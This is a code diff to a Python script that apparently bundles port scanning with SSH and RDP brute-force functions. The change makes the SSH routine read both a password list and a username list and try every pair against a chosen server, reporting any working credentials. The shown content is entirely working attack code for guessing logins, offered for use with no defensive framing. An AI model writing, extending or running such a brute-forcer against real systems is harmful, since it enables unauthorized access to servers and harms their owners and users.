@@ -40,32 +40,39 @@ def port_scan():
 
 # Function for SSH Brute Force using fabric
 def ssh_brute_force():
-    # Prompt user for SSH server IP address and username
+    # Prompt user for SSH server IP address
     ssh_ip = input("Enter the SSH server IP address: ")
-    ssh_username = input("Enter the SSH username: ")
 
     # Prompt user for the word list file path
     word_list_path = input("Enter the word list file path: ")
     # Read the word list from the file
-    with open(word_list_path, 'r') as file:
-        words = file.read().splitlines()
+    with open(word_list_path, 'r') as word_file:
+        words = word_file.read().splitlines()
 
-    # Iterate through each word in the list and attempt SSH login
+    # Prompt user for the usernames file path
+    usernames_file_path = input("Enter the usernames file path: ")
+    # Read the usernames from the file
+    with open(usernames_file_path, 'r') as user_file:
+        usernames = user_file.read().splitlines()
+
+    # Iterate through each word in the list and each username, attempting SSH login
     for word in words:
-        word = word.rstrip()
-        try:
-            with Connection(host=ssh_ip, user=ssh_username, connect_kwargs={"password": word}) as conn:
-                # Try running a simple command to check if the login is successful
-                result = conn.run("echo 'Successful SSH login.'", hide=True)
-                if result.ok:
-                    print(f"SSH Login successful! Password found: {word}")
-                    # Exit the loop if successful login
-                    break
-        except Exception as e:
-            print(f"SSH Login failed for password: {word}")
-        finally:
-            # Close the SSH connection regardless of the outcome
-            conn.close()
+        word = word.strip()
+        for username in usernames:
+            username = username.strip()
+            try:
+                with Connection(host=ssh_ip, user=username, connect_kwargs={"password": word}) as conn:
+                    # Try running a simple command to check if the login is successful
+                    result = conn.run("echo 'Successful SSH login.'", hide=True)
+                    if result.ok:
+                        print(f"SSH Login successful! Username: {username}, Password: {word}")
+                        # Exit the loop if successful login
+                        break
+            except Exception as e:
+                print(f"SSH Login failed for Username: {username}, Password: {word}")
+            finally:
+                # Close the SSH connection regardless of the outcome
+                conn.close()
 
 # Function for RDP Brute Force
 def rdp_brute_force():
